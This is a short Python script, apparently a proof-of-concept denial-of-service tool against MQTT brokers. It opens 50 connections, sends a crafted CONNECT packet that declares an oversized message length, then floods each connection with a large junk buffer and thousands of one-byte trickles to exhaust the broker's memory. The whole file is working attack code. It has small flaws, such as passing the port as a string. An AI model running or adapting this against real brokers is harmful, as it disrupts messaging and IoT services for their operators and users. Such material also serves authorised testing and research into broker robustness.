#!/usr/bin/python3

import socket               # Import socket module
import sys

# Max size of mqtt connect payload 327683

# -----------------------------------------------------------------------------
# Main
# -----------------------------------------------------------------------------
def main():

    if(len(sys.argv) != 3):
        print('error, sample invocation is: $python3 connect_attack.py <broker_address> <port>')

    host_specified = sys.argv[1]            # Broker Address.
    port_specified = sys.argv[2]            # Broker Port.
    bogus_init = bytearray(326000)       # Sizeable Payload To Send
    bogus_trickle = bytearray(1)

    # Connect Packet Structure
    #   Reserved
    #   Message Length
    #   Protocol Name Length
    #   Protocol Name
    #   Version
    #   Reserved
    #   Keep-Alive
    #   Client ID
    connect_payload = b'\x10' \
                   b'\xff\xff\x13' \
                   b'\x00\x04' \
                   b'\x4d\x51\x54\x54' \
                   b'\x04' \
                   b'\x02' \
                   b'\x00\x3c' \
                   b'\x00\x00'

    sockets = []  # Sockets for connecting to broker
    connections = []  # Valid socket connections for sending the payloads

    # Open sockets
    for i in range(50):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)  # Create a socket object
            sockets.append(s)
        except:
            continue

    # Connect to broker server with 3-way handshake
    for s in sockets:
        try:
            s.connect((host_specified, port_specified))
            connections.append(s)
        except:
            continue

    # Create broker connections for each successful socket
    for c in connections:
        try:
            c.send(connect_payload)
        except:
            continue

    # Send bogus payloads to fill up broker memory
    print()
    print('sending payloads')

    for c in connections:
        try:
            c.send(bogus_init)
        except:
            continue

    for i in range(2680):
        for c in connections:
            try:
                c.send(bogus_trickle)
            except:
                continue

    print('payloads finished')


# -----------------------------------------------------------------------------
#
# -----------------------------------------------------------------------------
if __name__ == "__main__":
    main()